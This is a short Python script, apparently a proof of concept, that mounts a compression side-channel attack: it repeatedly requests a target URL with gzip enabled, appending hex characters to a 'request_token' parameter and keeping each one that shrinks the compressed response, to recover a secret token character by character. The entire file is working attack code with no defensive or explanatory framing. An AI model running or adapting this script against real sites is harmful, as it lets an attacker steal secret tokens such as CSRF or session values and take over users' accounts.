import requests
import time

# Replace with the actual URL of the target page
url = 'https://malbot.net/poc'
# The name of the query parameter to manipulate
param_name = 'request_token'

# All hexadecimal characters to try as possible token characters
possible_chars = '0123456789abcdef'

# Initialize the guessed token as an empty string
guessed_token = ''

def get_response_length(guess):
    """
    Sends a request with the given guess and returns the length of the compressed response.

    Args:
        guess (str): The current guessed token.

    Returns:
        int: The length of the compressed response content.
    """
    params = {param_name: guess}
    headers = {
        'Accept-Encoding': 'gzip, deflate'  # Ensure the response is compressed
    }
    try:
        response = requests.get(url, params=params, headers=headers)
        response.raise_for_status()
        compressed_length = len(response.content)
        return compressed_length
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None

while True:
    found_char = False
    # Get the baseline response length without any new character
    baseline_length = get_response_length(guessed_token)
    if baseline_length is None:
        print("Failed to get baseline response length. Exiting.")
        break
    print(f"Current guessed_token: '{guessed_token}', baseline length: {baseline_length}")

    for c in possible_chars:
        # Append the character to the current guess
        current_guess = guessed_token + c
        # Get the response length for the current guess
        response_length = get_response_length(current_guess)
        if response_length is None:
            continue  # Skip to the next character if the request failed
        print(f"Trying '{current_guess}': response length = {response_length}")

        # If the response length decreases, we've guessed the correct character
        if response_length < baseline_length:
            print(f"Found character: '{c}'")
            guessed_token += c
            found_char = True
            break  # Proceed to guess the next character

        time.sleep(0.1)  # Delay to avoid overwhelming the server

    if not found_char:
        print("Could not find the next character. Exiting.")
        break  # Exit if no character causes a decrease in response length

print(f"Guessed token: '{guessed_token}'")